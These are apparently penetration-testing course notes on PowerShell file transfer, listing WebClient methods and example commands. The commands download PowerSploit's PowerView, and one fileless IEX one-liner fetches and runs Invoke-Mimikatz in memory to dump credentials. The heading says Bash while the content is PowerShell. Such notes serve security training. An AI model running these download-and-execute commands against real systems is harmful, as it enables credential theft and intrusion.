

# Bash Script Commands

PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:


- OpenRead	Returns the data from a resource as a Stream.

- OpenReadAsync	Returns the data from a resource without blocking the calling thread.

- DownloadData	Downloads data from a resource and returns a Byte array.

- DownloadDataAsync	Downloads data from a resource and returns a Byte array without blocking the calling thread.

- DownloadFile	Downloads data from a resource to a local file.
DownloadFileAsync	Downloads data from a resource to a local file without blocking the calling thread.

- DownloadString	Downloads a String from a resource and returns a String.

- DownloadStringAsync	Downloads a String from a resource without blocking the calling thread.

## PowerShell DownloadFile Method

We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.

- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
- PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
- PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')


## Fileless Method 
- PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

## Invoke webrequest
- PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

# Common Errors with PowerShell
- There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.
